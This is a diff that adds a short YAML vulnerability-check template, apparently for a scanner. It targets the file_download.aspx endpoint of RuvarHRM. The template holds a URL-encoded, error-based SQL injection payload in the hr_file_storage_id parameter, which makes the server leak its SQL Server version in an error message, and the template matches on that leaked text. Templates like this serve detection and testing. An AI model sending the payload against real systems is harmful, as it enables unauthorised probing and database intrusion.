@@ -1,0 +1,16 @@
+name: poc-yaml-ruvarhrm-filedownload-sqli
+rules:
+  - method: GET
+    path: /RuvarHRM/web_common/file_download.aspx
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      hr_file_storage_id=1%27%29and%201%3Dconvert%28int%2C%28char%2871%29%2bchar%2865%29%2bchar%2879%29%2bchar%2832%29%2bchar%2874%29%2bchar%2873%29%2bchar%2864%29%2b@@version%20%29%29--"
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"GAO JI@Microsoft SQL Server")
+detail:
+  author: Explo1t
+  links:
+    - https://github.com/epony4c
+    - https://vulners.com/seebug/SSV:91623/
